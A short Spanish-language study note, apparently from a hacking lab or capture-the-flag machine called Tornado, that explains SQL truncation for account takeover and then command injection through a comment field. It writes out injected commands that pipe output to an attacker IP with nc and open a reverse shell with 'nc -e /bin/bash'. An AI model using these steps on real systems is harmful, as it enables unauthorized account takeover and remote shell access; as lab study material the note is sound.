En pocas palabras el sql truncation se aplica cuando existe un limite de caracteres en una pagina login entonces lo que haces es *sobrepasar el limite de caracteres y poder modificar el usuario o correo de una web*




Estamos en una pestaña de login pero vemos que TIENE LIMITE DE CARACTERES el campo de correo
entonces lo que hacemos es modificamos desde el inspector los caracteres y nos metemos y ponemos el correo que incluye los 13 caracteres y le agregamos un par de espacios y le agregamos una letra


![[Pasted image 20250416163359.png]]

Lo que hace es que todo lo demas lo borra pero los espacios resultantes los borra
entonces a pesar de que ya existe el usuario a la hora de crear el perfil si le agregamos los espacios  y la letra a lo que hace es que lo corrompe y se crea el perfil aunque ya exista

Y en base a ese error se le ha logrado cambia la contraseña con solo registrarse con el mismo correo pero añadiendole espacios superando el limite de caracteres

jaco@tornado     a
1234567890123

A partir del 13avo espacio borra lo demas pero lo registra y asi cambias la password

Ahora dentro de ese usuario nos enfrentamos un campo donde puedes ingresar comentarios entonces lo que hacemos es utilizamos hola; whoami
y vemos que se ejecuta
ahora probamos con
test; whoami | nc 192.168.0.62 443 y asi logramos conseguir conexion
Ahora usaremos
test; whoami | nc -e /bin/bash 192.168.0.62 443

ya una vez entablado conexion hacemos tratamiento de la tty
#tratamientotty

Hay algo llamado alias en apache es decir
Alias /~tornado/  "/home/tornado"

cuando quieres ingresar al directorio /home/tornado pero para hacer un atajo usas ~tornado/
